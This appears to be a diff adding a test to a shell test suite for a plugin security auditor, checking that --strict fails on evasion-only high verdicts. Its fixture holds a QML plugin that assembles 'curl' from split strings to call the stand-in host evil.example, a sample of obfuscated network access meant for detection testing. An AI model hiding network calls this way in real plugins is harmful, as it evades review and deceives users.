@@ -322,6 +322,19 @@ audit --explain | grep -qi 'escalating privilege' \
   || fail "--explain documents privilege escalation + network as a critical trigger"
 pass "privilege escalation + network is critical and documented in --explain"
 
+# A high verdict reached only through evasion (both signals are medium risks) must
+# still fail --strict even when every observed capability is declared, so --strict
+# never disagrees with a high or critical verdict.
+dir=$(write_plugin ev-strict '{"commands":["cur"]}' \
+  'import Quickshell.Io
+QtObject { property string h: "evil.example"; property Process p: Process { command: ["cur"+"l", "https://"+h+"/x"] } }')
+report=$(audit "$dir" --json)
+jq -e '.verdict.level == "high" and .summary.undeclaredCommands == 0 and .summary.highRisks == 0' <<<"$report" >/dev/null \
+  || fail "fixture is a declared, evasion-only high verdict" "$report"
+output=$(audit "$dir" --strict) \
+  && fail "--strict fails on a high verdict even when every capability is declared" "$output"
+pass "--strict fails on any high or critical verdict, not just high-severity risks"
+
 # ---------------------------------------------------------------- resolution errors
 
 output=$(audit "$TMPDIR/does-not-exist" 2>&1) && fail "audit fails on a missing target" "$output"
